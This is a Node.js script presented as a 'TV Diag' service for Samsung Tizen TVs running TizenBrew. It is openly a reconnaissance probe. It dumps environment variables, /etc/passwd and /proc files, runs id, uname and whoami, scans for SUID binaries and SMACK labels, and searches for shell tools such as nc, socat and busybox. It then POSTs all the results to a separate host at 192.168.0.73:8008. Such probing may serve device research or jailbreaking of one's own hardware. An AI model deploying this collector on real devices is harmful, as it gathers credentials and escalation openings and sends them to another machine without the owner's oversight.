// TV Diag service — runs in TizenBrew Node.js service context
// Collects system info and beacons to Mac at 192.168.0.73:8008
const fs = require('fs');
const http = require('http');
const os = require('os');

const BEACON = 'http://192.168.0.73:8008/tv-results';
const results = {};

function collect() {
  // Basic process info
  results.uid = process.getuid ? process.getuid() : 'no getuid';
  results.gid = process.getgid ? process.getgid() : 'no getgid';
  results.pid = process.pid;
  results.ppid = process.ppid;
  results.nodeVersion = process.version;
  results.platform = process.platform;
  results.arch = process.arch;
  results.env = process.env;

  // Filesystem probes (unlimitedstorage should allow these)
  const paths = [
    '/proc/version',
    '/proc/cpuinfo',
    '/proc/self/status',
    '/proc/self/maps',
    '/proc/self/environ',
    '/opt/usr/bin/',
    '/opt/usr/sbin/',
    '/bin/',
    '/usr/bin/',
    '/etc/passwd',
    '/system/bin/',
    '/system/xbin/',
  ];

  results.fs = {};
  for (const p of paths) {
    try {
      if (p.endsWith('/')) {
        const items = fs.readdirSync(p);
        results.fs[p] = items.slice(0, 50);
      } else {
        const content = fs.readFileSync(p, 'utf-8');
        results.fs[p] = content.substring(0, 2000);
      }
    } catch (e) {
      results.fs[p] = 'ERR: ' + e.message;
    }
  }

  // Try child_process (the big one)
  try {
    const cp = require('child_process');
    results.child_process = 'AVAILABLE';
    const idOut = cp.execSync('id', {timeout: 5000}).toString().trim();
    results.id = idOut;
    const unameOut = cp.execSync('uname -a', {timeout: 5000}).toString().trim();
    results.uname = unameOut;
    const whoami = cp.execSync('whoami', {timeout: 5000}).toString().trim();
    results.whoami = whoami;

    // SUID scan
    try {
      const suid = cp.execSync('find / -perm -4000 -type f 2>/dev/null | head -40', {timeout: 15000}).toString().trim();
      results.suid = suid || '(none found)';
    } catch (e) {
      results.suid = 'find failed: ' + e.message;
    }

    // SMACK check
    try {
      const smack = cp.execSync('cat /proc/self/attr/current 2>/dev/null; echo ---; cat /sys/fs/smack/*/ 2>/dev/null | head -20', {timeout: 5000}).toString().trim();
      results.smack = smack || '(no /sys/fs/smack found)';
    } catch (e) {
      results.smack = 'SMACK check failed: ' + e.message;
    }

    // Kernel modules
    try {
      const mods = cp.execSync('ls /proc/modules 2>/dev/null && cat /proc/modules | head -20', {timeout: 5000}).toString().trim();
      results.kmods = mods;
    } catch (e) {
      results.kmods = 'modules check failed';
    }

    // Check for interesting binaries
    try {
      const interesting = cp.execSync('which nc ncat socat python python2 python3 busybox su 2>/dev/null; ls /bin/sh /system/bin/sh /bin/bash /system/bin/busybox 2>/dev/null', {timeout: 5000}).toString().trim();
      results.shell_bins = interesting || '(none found)';
    } catch (e) {
      results.shell_bins = 'bin check failed: ' + e.message;
    }

  } catch (e) {
    results.child_process = 'NOT AVAILABLE: ' + e.message;
  }

  // Tizen API info
  try {
    results.tizen_version = tizen.systeminfo.getCapability ? tizen.systeminfo.getCapability('http://tizen.org/feature/platform.version') : 'unknown';
    results.tizen_model = tizen.systeminfo.getCapability ? tizen.systeminfo.getCapability('http://tizen.org/feature/device/model') : 'unknown';
  } catch (e) {
    results.tizen_version = 'n/a';
  }

  return results;
}

function beacon(data) {
  return new Promise((resolve) => {
    const body = JSON.stringify(data, null, 2);
    const req = http.request({
      hostname: '192.168.0.73',
      port: 8008,
      path: '/tv-results',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      },
      timeout: 10000
    }, (res) => {
      let resp = '';
      res.on('data', (c) => resp += c);
      res.on('end', () => resolve(resp));
    });
    req.on('error', (e) => resolve('beacon failed: ' + e.message));
    req.on('timeout', () => { req.destroy(); resolve('beacon timeout'); });
    req.write(body);
    req.end();
  });
}

// Main
collect();
beacon(results).then((r) => {
  console.log('[tvdiag] beacon result:', r);
}).catch((e) => {
  console.log('[tvdiag] beacon error:', e.message);
});
